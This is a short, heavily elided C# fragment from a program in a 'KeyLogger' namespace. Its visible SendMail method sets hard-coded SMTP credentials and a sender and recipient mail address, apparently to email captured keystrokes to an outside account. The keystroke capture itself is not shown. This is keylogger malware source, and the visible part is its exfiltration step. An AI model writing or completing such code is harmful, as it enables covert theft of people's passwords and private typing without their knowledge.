...
namespace KeyLogger
{
    class Program
    {
        ...
        private static void SendMail()
        {
            ...
            client.Credentials = new System.Net.NetworkCredential("asbsds123", "password");

            MailAddress from = new MailAddress("asbsds123@gmail.com", "김재겸", System.Text.Encoding.UTF8);
            MailAddress to = new MailAddress("asbsds123@naver.com");
